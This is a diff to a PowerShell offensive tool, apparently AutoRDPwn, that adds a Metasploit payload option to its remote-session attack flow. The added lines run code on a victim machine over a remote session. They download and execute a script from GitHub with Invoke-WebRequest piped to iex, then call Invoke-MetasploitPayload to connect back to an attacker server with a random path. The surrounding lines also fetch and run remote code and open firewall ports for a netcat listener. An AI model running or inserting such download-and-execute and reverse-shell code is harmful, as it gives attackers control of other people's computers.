@@ -386,7 +386,8 @@ if($Language -in 'Spanish') {
         Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
 	Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; sleep -milliseconds 2500 }
 
-        if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
+        if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
+	$metarandom= -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
         if($shell -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
@@ -616,6 +617,12 @@ Write-Host "--------------------------------------------------------------------
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}
+
+if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
+Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
+Invoke-MetasploitPayload -url https://$metaserver/$metarandom -verbose
+Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
